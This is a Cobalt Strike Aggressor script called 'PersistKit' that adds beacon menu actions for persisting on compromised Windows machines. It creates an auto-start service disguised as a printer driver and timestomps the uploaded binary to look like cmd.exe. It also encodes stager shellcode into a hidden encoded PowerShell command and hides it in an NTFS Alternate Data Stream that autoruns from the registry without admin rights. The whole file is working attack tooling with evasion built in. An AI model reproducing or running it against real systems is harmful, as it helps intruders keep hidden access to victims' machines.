# Actions in this kit center around endpoint persistence. Examples include backdoor service creation, backdoor process creation, etc
# @Und3rf10w

# Used for "Create Backdoor Service" action
sub servicefilename {
	$servicebackdoorfilename = matches($1, '[\/](\w+\.\w+)$');
	$servicebackdoorfilename = $servicebackdoorfilename[0];
	return $servicebackdoorfilename;
}

# Menu-driven operation to create an NTFS Alternate Data Stream backdoor that
# 	autoruns on boot. Does NOT require admin
sub createADSBackdoor {
	$bid = $1;
	$selectedListener = $2;
	getADSRegName();
	bpowershell_import($bid, script_resource("PersistKit/scripts/Invoke-ADSBackdoor.ps1"));
	prompt_text("Location of file/folder to give ADS (it must exist!)?", "%APPDATA%\Temp\somefile.txt", {
		# Encode shellcode for the stager
		$psPayload = powershell_encode_stager(shellcode($selectedListener));
		$fullPsPayload = "powershell.exe -nop -w hidden -encodedcommand $psPayload ";
		binput($bid, "powershell-import Invoke-ADSBackdoor.ps1");
		binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName $theADSRegName -backdoored_file_path $1 -cobaltstrike_gen_payload");
		bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName $theADSRegName -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
	});
}

# Returns a string to use for the reg key name
sub getADSRegName {
	prompt_text("Registry key name you'd like to use?", "Update", {
		$theADSRegName = $1;
	});
	return $theADSRegName;
}

popup beacon_bottom {
	menu "PersistKit" {
		item "Create Backdoor Service"{
			local ('$bid');
			# TODO:
			#	* build out a proper Java Swing menu to customize the options
			foreach $bid ($1){
				prompt_file_open("Select the service exe to use", $null, false, {
					println("\c4Uploading backdoor on beacon $1 using file $2 ");
					blog($1, "Attempting to publish backdoor service");
					bcd($1, "C:\\Windows\\");
					println("\c4Changed directory on beacon $1 to C:\\Windows\\");
					bupload($1, $2);
					servicefilename($2);
					btimestomp($1, "$servicebackdoorfilename", "C:\\Windows\\system32\\cmd.exe")
					prompt_text("Name of service to use?", "GenericPrinterDriver", {
						$serviceName = $1;
					});
					prompt_text("Service Display Name to use?", "Generic Printer Driver Support", {
						$serviceDisplayName = $1;
					});
					bshell($1, "sc create $serviceName binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \" $serviceDisplayName \"");
					bshell($1, "sc start $serviceName ");
					blog($1, "Backdoor service created using $servicebackdoorfilename ");
					println("\c9[+] Backdoor creation complete!");
				});
			}
		}
		item "Create NTFS ADS Backdoor"{
				local ('$bid');
				# Open a payload selection dialoge, passes it to createADSBackdoor()
				# TODO:
				#	* build out a proper Java Swing menu to customize the options
				#	* Modify the powershell script to determine which key to write to HKLM || HKCU
				foreach $bid ($1){
					openPayloadHelper(lambda({
					createADSBackdoor($bid, $1);
				}, $bid => $1));
			}
		}
	}
}